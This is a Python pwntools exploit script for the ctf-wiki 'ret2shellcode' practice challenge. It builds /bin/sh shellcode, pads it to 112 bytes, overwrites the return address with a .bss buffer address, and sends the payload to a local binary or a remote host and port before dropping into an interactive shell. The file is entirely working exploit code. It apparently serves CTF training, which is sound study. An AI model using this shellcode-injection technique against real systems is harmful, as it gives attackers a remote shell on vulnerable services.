from pwn import *
from misc import utils

local = 1

if __name__ == "__main__":
    """
    .bss not executable!
    """
    addr = '../../challenges/ctfwiki/ret2shellcode'
    ip = '111.200.241.244:65037'
    r = None
    if not local:
        r = remote(ip.split(':')[0], int(ip.split(':')[1]))
    else:
        r = process([addr])

    shellcode = asm(shellcraft.sh())
    buf2_addr = 0x804a080

    payload = shellcode.ljust(112, b'A') + p32(buf2_addr)  # dynamic debug, cyclic 200 as input
    utils.write_bins(payload, 'ret2shellcode_poc')

    r.sendline(payload)

    r.interactive()
